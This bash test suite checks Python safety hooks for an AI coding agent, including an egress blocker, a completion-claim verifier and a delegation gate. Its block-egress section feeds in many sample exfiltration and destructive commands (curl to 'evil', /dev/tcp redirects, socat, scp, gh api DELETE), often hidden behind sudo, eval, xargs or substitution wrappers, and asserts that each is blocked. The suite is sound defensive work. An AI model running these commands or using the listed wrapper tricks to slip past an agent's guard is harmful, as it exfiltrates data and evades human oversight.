#!/usr/bin/env bash
# Automated verification for the Python hooks under home/.claude/hooks/.
#
# CI shellchecks every *.sh and lints settings.json, but nothing exercised the *.py hooks:
# a syntax error or a broken exit-code contract (dropping the subagent_type=fork exemption,
# or the stop_hook_active self-limit) would merge silently and only surface at runtime as a
# wedged session (a blocking hook throwing) or a silently-neutered gate (a hook failing open
# and blocking nothing). This turns the README's manual test recipe into an enforced gate
# (#40, #41).
#
# Two layers:
#   1. py_compile every tracked *.py — catches syntax / import-time breakage (#40).
#   2. feed synthetic hook-input JSON to each live hook and assert the exit code
#      (2 = block, 0 = allow), the contract hooks/README.md documents by hand (#41).
#
# Lives OUTSIDE home/.claude/ on purpose: install.sh symlinks that tree into the user's live
# config, so repo-/CI-only tooling must not live there (CLAUDE.md). Run: bash tests/test_hooks.sh
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOKS="$REPO_DIR/home/.claude/hooks"
cd "$REPO_DIR"

fail=0

# --- layer 1: every tracked Python file must byte-compile ---------------------------------
echo "== py_compile =="
mapfile -t pyfiles < <(git ls-files '*.py')
if [ "${#pyfiles[@]}" -eq 0 ]; then
  echo "no tracked python files to compile"
else
  printf 'compiling: %s\n' "${pyfiles[@]}"
  python3 -m py_compile "${pyfiles[@]}"
  echo "py_compile OK"
fi

# --- layer 2: exit-code contract for the live hooks ---------------------------------------
# assert_exit <expected> <hook> <json-input> <description>
assert_exit() {
  local expected="$1" hook="$2" input="$3" desc="$4" actual
  set +e
  printf '%s' "$input" | python3 "$hook" >/dev/null 2>&1
  actual=$?
  set -e
  if [ "$actual" = "$expected" ]; then
    echo "  ok: $desc (exit=$actual)"
  else
    echo "  FAIL: $desc — expected exit=$expected, got exit=$actual" >&2
    fail=1
  fi
}

echo "== require-delegation-model.py =="
RDM="$HOOKS/require-delegation-model.py"
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","prompt":"x"}}'              "blocks generic subagent_type=claude with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"general-purpose","prompt":"x"}}'     "blocks generic subagent_type=general-purpose with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"prompt":"x"}}'                                       "blocks a missing subagent_type with no model="
assert_exit 2 "$RDM" '{"tool_name":"Task","tool_input":{"subagent_type":"claude","prompt":"x"}}'               "blocks the same delegation under the historical tool_name Task (#138)"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"fork","prompt":"x"}}'                "exempts subagent_type=fork"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"Explore","prompt":"x"}}'             "exempts named subagent_type (resolves model from its own definition)"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","model":"haiku","prompt":"x"}}' "allows an explicit model="
assert_exit 0 "$RDM" '{"tool_name":"Bash","tool_input":{}}'                                                    "ignores non-Agent tools"
assert_exit 0 "$RDM" 'not-json'                                                                                "fails open on malformed JSON"

echo "== verify-completion-claim.py =="
VCC="$HOOKS/verify-completion-claim.py"
assert_exit 0 "$VCC" '{"stop_hook_active":true}'                    "self-limits when stop_hook_active is set"
assert_exit 0 "$VCC" '{"transcript_path":"/nonexistent/xyz.jsonl"}' "fails open on an unreadable transcript"
assert_exit 0 "$VCC" 'not-json'                                     "fails open on malformed JSON"

# Real transcript shapes for /verify via the Skill and SlashCommand tools, captured against a
# live Claude Code session (#109): a Skill invocation serializes as tool_use name="Skill" with
# input.skill="verify" (no leading slash), and a slash command as name="SlashCommand" with
# input.command="/verify ...". The VERIFY regex must match both, or a genuine /verify run over
# edited product code is treated as unverified and the stop gets blocked.
build_transcript() {
  # $1 = tool name, $2 = tool input JSON (as a JSON literal), writes path to stdout
  local tmp
  tmp="$(mktemp)"
  python3 - "$tmp" "$1" "$2" <<'PY'
import json
import sys

path, tool_name, tool_input_json = sys.argv[1], sys.argv[2], sys.argv[3]
tool_input = json.loads(tool_input_json)
records = [
    {"message": {"role": "user", "content": "please fix the bug"}},
    {"message": {"role": "assistant", "content": [
        {"type": "tool_use", "name": "Edit", "input": {"file_path": "foo.py"}}
    ]}},
    {"message": {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "t1", "content": "ok"}
    ]}},
    {"message": {"role": "assistant", "content": [
        {"type": "tool_use", "name": tool_name, "input": tool_input}
    ]}},
    {"message": {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "t2", "content": "verified"}
    ]}},
    {"message": {"role": "assistant", "content": "All tests pass now."}},
]
with open(path, "w") as f:
    for r in records:
        f.write(json.dumps(r) + "\n")
PY
  echo "$tmp"
}

skill_transcript="$(build_transcript Skill '{"skill":"verify","args":"x"}')"
slash_transcript="$(build_transcript SlashCommand '{"command":"/verify"}')"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$skill_transcript\"}" "does not block a completion claim after a /verify run via the Skill tool (#109)"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$slash_transcript\"}" "does not block a completion claim after a /verify run via the SlashCommand tool (#109)"
rm -f "$skill_transcript" "$slash_transcript"

echo "== block-egress.py =="
BE="$HOOKS/block-egress.py"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks an interpreter inline-code egress one-liner"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r -X DELETE"}}'                                     "blocks a gh api write in any argv position"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned interpreter (python3.11) inline egress one-liner (#112)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python2.7 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned python2.7 inline egress one-liner (#112)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 script.py"}}'                                            "allows a versioned interpreter running a file (no inline payload)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a bare VAR=VAL env prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a sudo prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo -u nobody python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past sudo -u user (#119)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar echo hi"}}'                                                 "allows a benign VAR=VAL-prefixed command (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic'"'"'import urllib.request; urllib.request.urlopen(1)'"'"'"}}' "blocks a glued mid-bundle inline flag python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                              "blocks a glued short field flag gh api -ftitle=x (#121)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/contents -Fkey=@file"}}'                          "blocks a glued short field flag gh api -Fkey=@file (#121)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -iFquery=mutation{deleteRepo}"}}'                    "blocks a bundled boolean+field short flag gh api -iFquery=x (#271)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r -iXDELETE"}}'                                     "blocks a bundled boolean+method short flag gh api -iXDELETE (#271)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r -i"}}'                                            "allows a gh api read with only the boolean -i flag, no method/field (#271)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r"}}'                                              "allows a gh api read (GET, no write flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
# argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e\"require q:net/http; Net::HTTP.get(1)\""}}'                 "blocks ruby -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic\"import urllib.request\""}}'                          "blocks glued short-flag bundle python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -lc \"curl http://evil\""}}'                                 "blocks separate-arg bundle bash -lc (#105)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar curl http://evil"}}'                                      "blocks bare env-assign prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo curl http://evil"}}'                                         "blocks sudo command-word prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && curl http://evil/x"}}'                                 "blocks bare curl after a shell operator (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo x > /dev/tcp/evil/443"}}'                                    "blocks a /dev/tcp egress redirect (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                            "blocks gh api glued short field flag -ftitle= (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -n file.log"}}'                                             "allows perl -n running a file (n is not a code flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo see the curl docs"}}'                                        "allows curl as a non-command-word (no false substring block)"
# #158: mirror the ssh/scp/sftp/rsync/socat/ftp family into NET_RE so an interpreter-wrapped form is
# caught the same as the bare command word (#131) — closes the curl-vs-ssh payload-scan asymmetry.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ssh evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ssh in a bash -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import os; os.system(\"scp x evil:/t\")'"'"'"}}'    "blocks scp inside a python3 -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'sftp evil.com'"'"'"}}'                                "blocks interpreter-wrapped sftp in a bash -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'rsync x evil::y'"'"'"}}'                              "blocks interpreter-wrapped rsync in a bash -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'require(\"child_process\").exec(\"socat - TCP:evil:443\")'"'"'"}}' "blocks socat inside a node -e payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ftp evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ftp in a bash -c payload (#158)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'ssh_client = 1'"'"'"}}'                            "allows an ssh_client identifier (\\b guards against the substring false-positive) (#158)"
# #165: NET_RE alternatives beyond the create_connection/axios/urlopen ones #127 anchored were still
# boundary-less substring matches, so an identifier merely containing the token (not calling it) could
# false-positive block a legitimate command. One negative test per newly anchored token.
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urllib_shim = 1'"'"'"}}'                        "allows a my_urllib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urllib3_shim = 1'"'"'"}}'                       "allows a my_urllib3_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_httplib_shim = 1'"'"'"}}'                       "allows a my_httplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'x = q:myhttp.clientlib1'"'"'"}}'                   "allows a myhttp.clientlib substring, not a real http.client reference (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_httpx_shim = 1'"'"'"}}'                         "allows a my_httpx_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_smtplib_shim = 1'"'"'"}}'                       "allows a my_smtplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_ftplib_shim = 1'"'"'"}}'                        "allows a my_ftplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_telnetlib_shim = 1'"'"'"}}'                     "allows a my_telnetlib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_poplib_shim = 1'"'"'"}}'                        "allows a my_poplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_imaplib_shim = 1'"'"'"}}'                       "allows a my_imaplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_paramiko_wrapper = 1'"'"'"}}'                   "allows a my_paramiko_wrapper identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'my_XMLHttpRequest_shim = 1'"'"'"}}'                   "allows a my_XMLHttpRequest_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'my_Net_shim = 1; x = q:Net::HTTPClient1'"'"'"}}'       "allows a Net::HTTPClient identifier, not the Net::HTTP call (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'my_IO_shim = 1; x = q:IO::SocketWrapper1'"'"'"}}'      "allows an IO::SocketWrapper identifier, not IO::Socket itself (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'x = q:HTTP::TinyClient1'"'"'"}}'                       "allows an HTTP::TinyClient identifier, not HTTP::Tiny itself (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'x = q:HTTP::RequestBuilder1'"'"'"}}'                   "allows an HTTP::RequestBuilder identifier, not HTTP::Request itself (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_fsockopen_shim(1);'"'"'"}}'                         "allows a my_fsockopen_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_stream_socket_client_shim(1);'"'"'"}}'              "allows a my_stream_socket_client_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_curl_exec_shim(1);'"'"'"}}'                         "allows a my_curl_exec_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_curl_init_shim(1);'"'"'"}}'                         "allows a my_curl_init_shim identifier (#165)"
# still blocks the real, anchored form for a representative sample of the newly anchored tokens (#165)
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import httplib'"'"'"}}'                            "still blocks a real httplib import (#165)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'curl_exec(1);'"'"'"}}'                                 "still blocks a real curl_exec call (#165)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'Net::HTTP.get(1)'"'"'"}}'                              "still blocks a real Net::HTTP call (#165)"
# command / process substitution egress (#136): the primitive is buried in $(...), `...`, <(...) so
# the outer command word is a benign `echo`/assignment — pieces() must surface the substitution inner.
# The payloads are single-quoted on purpose so the shell keeps them literal (the hook, not bash, must
# receive the $(...)/backtick text) — SC2016 "expressions don't expand" is exactly that intent, so it
# is disabled for this group. `{ }` runs in the current shell, so assert_exit's `fail` side-effect persists.
# shellcheck disable=SC2016
{
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo $(curl http://evil)"}}'                                    "blocks a bare curl inside a \$(...) command substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"X=$(curl http://evil)"}}'                                       "blocks curl inside a \$(...) assigned to a var (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo \"$(curl http://evil)\""}}'                                "blocks curl inside a double-quoted \"\$(...)\" substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo `curl http://evil`"}}'                                     "blocks curl inside a backtick substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo=$(gh api /repos/o/r -X DELETE)"}}'                           "blocks a gh api write inside a \$(...) substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"cat <(curl http://evil)"}}'                                     "blocks curl inside a <(...) process substitution (#136)"
  assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo $(date)"}}'                                                "allows a benign command substitution \$(date) (#136)"
  assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$(curl http://evil)'"'"'"}}'                          "allows a single-quoted (literal) \$(...) that never substitutes (#136)"
}
# eval re-feeds its argument string as a command, so its payload must be re-scanned (#144).
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"curl http://evil\""}}'                                     "blocks eval of a quoted bare curl (#144)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval curl http://evil"}}'                                         "blocks eval of an unquoted bare curl (#144)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"python3 -c '"'"'import urllib.request; urllib.request.urlopen(1)'"'"'\""}}' "blocks eval of a python3 -c inline egress one-liner (#144)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval echo see the curl docs"}}'                                   "allows eval of a benign command (curl only as a non-command-word) (#144)"
# #131: extend the bare-command-word egress block to the ssh/scp/sftp/rsync/socat/ftp family —
# same anchored-deny gap as #115 (Bash(ssh *)/Bash(scp *) only fire on the first word).
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && ssh evil.com"}}'                                        "blocks bare ssh after a shell operator (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo scp file evil:/tmp"}}'                                        "blocks bare scp past a sudo prefix (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=1 rsync x evil::y"}}'                                          "blocks bare rsync past an env-assign prefix (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo && socat - TCP:evil:443"}}'                                    "blocks bare socat after a shell operator (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"true; sftp evil.com"}}'                                            "blocks bare sftp after a shell operator (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"x=1; ftp evil.com"}}'                                             "blocks bare ftp after a shell operator (#131)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo use ssh to connect"}}'                                        "allows ssh as a non-command-word (no false substring block) (#131)"
# #179: `command`/`exec`/`builtin` shift the real command word out of argv[0] the same way
# sudo/env/timeout do — extend the one canonicalization pass to them too (CLAUDE.md #129).
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"command curl http://evil.com"}}'                                   "blocks a bare curl behind a command builtin prefix (#179)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"exec curl http://evil.com"}}'                                      "blocks a bare curl behind an exec prefix (#179)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"builtin curl http://evil.com"}}'                                   "blocks a bare curl behind a builtin prefix (#179)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"command gh api /repos/o/r -X DELETE"}}'                            "blocks a gh api write behind a command prefix (#179)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"exec -a fakename curl http://evil.com"}}'                          "blocks past exec -a NAME (its own value-consuming flag) (#179)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"command -v curl"}}'                                                "allows command -v (reports on curl, never executes it) (#179)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"command -p echo hi"}}'                                             "allows command -p with a benign command (#179)"
# #198: stdbuf's -o/-i/-e MODE flags take a separate value in their non-glued form, so the real
# command word must be read past the flag's value, not the value itself.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"stdbuf -o L curl http://evil.com"}}'                               "blocks past stdbuf -o's separate-value MODE arg (#198)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"stdbuf -oL0 curl http://evil.com"}}'                               "still blocks the glued stdbuf -oL0 form (#198)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -i curl http://evil.com"}}'                                     "env -i stays a boolean flag and doesn't swallow the command word (#198)"
# #199: the same separate-value gap as #198, found in xargs's -n/-s/-d while building the fuzzer.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -n 1 curl http://evil.com"}}'                                 "blocks past xargs -n's separate-value arg (#199)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -s 1000 curl http://evil.com"}}'                              "blocks past xargs -s's separate-value arg (#199)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -d , curl http://evil.com"}}'                                 "blocks past xargs -d's separate-value arg (#199)"
# #214: WRAPPER_VALUE_OPTS had no entry for `time` at all, so its own separate-value -o/-f flags
# weren't skipped, misreading the command word as the flag's own value.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"time -o results.txt curl http://evil.com"}}'                        "blocks past time -o's separate-value arg (#214)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"time -f %e curl http://evil.com"}}'                                 "blocks past time -f's separate-value arg (#214)"
# #203: the same gap pattern found in sudo/doas's own value flags by the fuzzer's independent
# sudo/doas reference table — a bare short flag was covered (-C/-D/-R/-U) but its long form
# wasn't, -T/--command-timeout was missing entirely, and doas's -a (auth style) was missing too.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --chdir /tmp curl http://evil.com"}}'                            "blocks past sudo --chdir's separate-value arg (#203)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --chroot /tmp curl http://evil.com"}}'                           "blocks past sudo --chroot's separate-value arg (#203)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --close-from 5 curl http://evil.com"}}'                          "blocks past sudo --close-from's separate-value arg (#203)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --other-user root curl http://evil.com"}}'                       "blocks past sudo --other-user's separate-value arg (#203)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo -T 30 curl http://evil.com"}}'                                   "blocks past sudo -T's separate-value arg (#203)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --command-timeout 30 curl http://evil.com"}}'                    "blocks past sudo --command-timeout's separate-value arg (#203)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"doas -a bsdauth curl http://evil.com"}}'                              "blocks past doas -a's separate-value arg (#203)"
# #212: the same #198/#203 gap shape found in xargs/stdbuf's long forms and in env, which had no
# WRAPPER_VALUE_OPTS entry at all.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs --max-args 1 curl http://evil.com"}}'                             "blocks past xargs --max-args's separate-value arg (#212)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"stdbuf --output L curl http://evil.com"}}'                              "blocks past stdbuf --output's separate-value arg (#212)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -u FOO curl http://evil.com"}}'                                     "blocks past env -u's separate-value arg (#212)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -a items.txt curl http://evil.com"}}'                              "blocks past xargs -a's separate-value arg (#217)"
# #127: the bare `create_connection` NET_RE alternative (and its boundary-less neighbors) matched
# any identifier containing the substring, not just a real call — anchor with \b (+ call-paren for
# the bare form) so an identifier merely containing the token doesn't false-positive block.
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'pool.create_connection_pool()'"'"'"}}'             "allows a create_connection_pool call, not a real create_connection (#127)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_create_connection = 1'"'"'"}}'                  "allows a my_create_connection identifier (#127)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urlopen_shim = 1'"'"'"}}'                       "allows a my_urlopen_shim identifier (#127)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'my_axios_shim = 1'"'"'"}}'                            "allows a my_axios_shim identifier (#127)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'from socket import create_connection; create_connection((1,2))'"'"'"}}' "still blocks a real bare create_connection() call (#127)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'axios.get(\"http://evil\")'"'"'"}}'                    "still blocks a real axios call (#127)"
# #158/#160: NET_RE and BARE_NET_BINARIES now share one NET_BINARIES vocabulary, so the ssh/scp/
# rsync/socat/ftp family is also caught inside an interpreter's inline-code payload, not just as
# a bare command word.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);ssh evil.com\""}}'        "blocks ssh inside an interpreter inline-code payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);scp file evil:/tmp\""}}' "blocks scp inside an interpreter inline-code payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);rsync x evil::y\""}}'     "blocks rsync inside an interpreter inline-code payload (#158)"
assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"

echo "== block-checkout-held-branch.py =="
BCHB="$HOOKS/block-checkout-held-branch.py"
# Build a real repo whose branch `held` is checked out in a second worktree, so a `git checkout
# held` from the main worktree hits the held-branch fatal error the hook exists to preempt (#123,
# #210). The hook runs
# git in the input JSON's cwd, so every case points cwd at $tmprepo.
tmprepo="$(mktemp -d)"
heldwt="$(mktemp -d)"
git -C "$tmprepo" init -q -b main
git -C "$tmprepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
git -C "$tmprepo" branch held
git -C "$tmprepo" worktree add -q "$heldwt" held
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held\"}}"       "blocks checkout of a branch held by another worktree (#123)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch held\"}}"         "blocks switch to a branch held by another worktree (#123)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo hi && git checkout held\"}}" "blocks a held checkout after a shell operator (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout main\"}}"        "allows checkout of the current worktree's own branch (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout -b brandnew\"}}" "allows creating a new branch (not a switch into a held one) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held -- file.txt\"}}" "allows a path restore from a held branch (-- paths, not a switch) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch --detach held\"}}"  "allows a detach at a held branch (holds no branch ref) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout nonexistent\"}}" "allows checkout of a branch no worktree holds (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo git checkout held\"}}"   "allows a non-git command that merely mentions checkout (#123)"
# #193: a wrapper/prefix word ahead of `git` must not shift the command word out of argv[0].
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"command git checkout held\"}}" "blocks a held checkout behind a command builtin prefix (#193)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"env git checkout held\"}}"     "blocks a held checkout behind an env prefix (#193)"
